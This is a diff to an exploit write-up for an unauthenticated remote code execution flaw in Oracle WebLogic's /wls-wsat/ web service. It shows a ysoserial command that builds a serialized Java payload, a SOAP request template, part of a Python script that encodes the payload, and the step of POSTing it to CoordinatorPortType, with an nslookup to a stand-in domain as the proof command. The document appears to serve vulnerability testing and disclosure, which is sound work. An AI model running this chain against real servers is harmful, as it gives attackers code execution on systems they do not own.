@@ -11,7 +11,7 @@ execution is possible without authentication.
 This exploit was tested against WebLogic 10.3.6.0.
 
 A typical vulnerable server will have HTTP services listening on one or more
-TCP ports which have a web application at /wls-wsat/.
+TCP ports which have a web application at `/wls-wsat/`.
 
 ## Generate a payload with ysoserial
 
@@ -23,8 +23,8 @@ java -jar ysoserial-0.0.5-all.jar Jdk7u21 "nslookup test222.ourns.example.com" >
 ```
 
 Here, we generate a payload using ysoserial which will do a DNS lookup that
-we'll be able to monitor.  The "payload" file contains a serialized Java
-LinkedHashSet object which will run this command.
+we'll be able to monitor.  The `payload` file contains a serialized Java
+`LinkedHashSet` object which will run this command.
 
 Note that the ysoserial payload generator used here, named Jdk7u21, only
 works under JRE version 7u21 and earlier (see
@@ -37,7 +37,7 @@ of any dependencies in the server's classpath.
 
 Next, we need to massage this blob into a SOAP HTTP request body.  The
 affected web services accept SOAP requests containing Java objects encoded
-in Java's XMLEncoder format.  An example request showing the format:
+in Java's `XMLEncoder` format.  An example request showing the format:
 
 ```
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
@@ -74,9 +74,9 @@ Content-Length: 204219
 </soapenv:Envelope>
 ```
 
-The payload generated above needs to be stuffed into a byte[] array by the
+The payload generated above needs to be stuffed into a `byte[]` array by the
 server. The following python script will generate the required request body
-and write it to a file named "payload_encoded".
+and write it to a file named `payload_encoded`.
 
 ```
 of = open('payload_encoded','w')
@@ -111,8 +111,8 @@ of.write(' <soapenv:Body/>\n')
 of.write('</soapenv:Envelope>\n')
 ```
 
-Next, send the generated request body to the affected service via a POST
-request to POST /wls-wsat/CoordinatorPortType. The entire resulting HTTP
+Next, send the generated request body to the affected service via a `POST`
+request to `/wls-wsat/CoordinatorPortType`. The entire resulting HTTP
 request should look just like the example above but much longer.
 
 The server will return a 500 response, however you should see your DNS
